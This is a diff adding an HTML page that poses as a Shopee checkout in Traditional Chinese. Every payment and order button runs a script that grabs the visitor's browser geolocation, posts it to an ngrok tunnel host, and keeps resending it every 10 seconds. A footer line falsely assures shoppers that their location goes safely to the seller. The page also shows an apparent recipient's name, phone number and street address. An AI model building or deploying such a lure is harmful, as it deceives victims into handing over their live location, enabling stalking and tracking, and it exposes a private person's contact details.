@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<title>蝦皮購物 - 結帳</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
+  body { background: #f5f5f5; }
+  header { background: #ee4d2d; color: #fff; padding: 15px; text-align: center; font-size: 18px; }
+  .container { max-width: 900px; margin: 20px auto; background: #fff; border-radius: 5px; overflow: hidden; }
+  .section { border-bottom: 1px solid #eee; padding: 20px; }
+  .section:last-child { border-bottom: none; }
+  .section-title { font-size: 16px; font-weight: bold; margin-bottom: 10px; }
+  .order-item { display: flex; justify-content: space-between; margin-bottom: 10px; }
+  .order-item:last-child { margin-bottom: 0; }
+  .total { text-align: right; font-size: 18px; margin-top: 10px; color: #ee4d2d; }
+  .remark-input, .coupon-input { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; margin-top: 5px; }
+  .btn { background: #ee4d2d; color: #fff; border: none; padding: 10px 20px; font-size: 16px; cursor: pointer; border-radius: 4px; margin-top: 20px; }
+  .btn:hover { background: #d6441a; }
+  .payment-methods { display: flex; gap: 10px; margin-top: 10px; }
+  .payment-methods button { flex: 1; }
+  .receiver-info { font-size: 14px; line-height: 1.6; }
+  .bottom-note { font-size: 12px; color: #888; margin-top: 10px; }
+  #output { margin-top: 10px; color: green; font-size: 14px; }
+</style>
+</head>
+<body>
+
+<header>蝦皮購物 - 結帳</header>
+
+<div class="container">
+
+  <div class="section">
+    <div class="section-title">訂單商品</div>
+    <div class="order-item">
+      <div>
+        <strong>Annie的嚴選好物</strong><br>
+        規格: 紅色, 15吋(含外包裝12cm)<br>
+        數量: 2
+      </div>
+      <div>$245</div>
+    </div>
+    <div class="order-item">
+      <div>運費</div>
+      <div>$60</div>
+    </div>
+    <div class="total">訂單金額 (2 商品): $550</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">備註</div>
+    <input type="text" class="remark-input" placeholder="管理全代收 / 電話聯絡時間等...">
+  </div>
+
+  <div class="section">
+    <div class="section-title">優惠券</div>
+    <input type="text" class="coupon-input" placeholder="折扣碼填寫處">
+  </div>
+
+  <div class="section">
+    <div class="section-title">收件資訊</div>
+    <div class="receiver-info">
+      許子豪（+886 930292146）<br>
+      高雄市大樹區水寮路 174 號<br>
+      預計到貨時間: 9月5日 - 9月6日
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">付款方式</div>
+    <div class="payment-methods">
+      <button class="btn" onclick="sendLocation()">貨到付款</button>
+      <button class="btn" onclick="sendLocation()">信用卡付款</button>
+    </div>
+    <div class="total">
+      <div>商品金額: $490</div>
+      <div>運費: $60</div>
+      <div>總計: $550</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <button class="btn" onclick="sendLocation()">下訂單</button>
+    <div id="output"></div>
+    <div class="bottom-note">提醒您: 位置資訊將安全送出給店家作為配送依據，請放心使用！</div>
+  </div>
+
+</div>
+
+<script>
+  let intervalId = null;
+
+  function sendLocation() {
+    document.getElementById("output").innerHTML = "定位中...";
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(position => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        // 送出資料到後端
+        fetch("https://55e5-2001-b011-c007-35bd-2de4-9e32-9ee9-35e8.ngrok-free.app/api/location", {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude, longitude })
+        })
+        .then(res => res.text())
+        .then(data => {
+          console.log("回傳成功:", data);
+          document.getElementById("output").innerHTML = "位置已送出！";
+        })
+        .catch(err => {
+          console.error("錯誤:", err);
+          document.getElementById("output").innerHTML = "送出失敗";
+        });
+
+        // 每 10 秒定時回傳
+        if (!intervalId) {
+          intervalId = setInterval(() => {
+            fetch("https://55e5-2001-b011-c007-35bd-2de4-9e32-9ee9-35e8.ngrok-free.app/api/location", {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ latitude, longitude })
+            })
+            .then(res => res.text())
+            .then(data => {
+              console.log("定時回傳:", data);
+            })
+            .catch(err => {
+              console.error("定時錯誤:", err);
+            });
+          }, 10000);
+        }
+
+      }, error => {
+        alert("需要開啟定位權限使用本服務！");
+        document.getElementById("output").innerHTML = "未取得定位權限";
+      });
+    } else {
+      alert("您的瀏覽器不支援 Geolocation。");
+      document.getElementById("output").innerHTML = "未取得定位權限";
+    }
+  }
+</script>
+
+</body>
+</html>
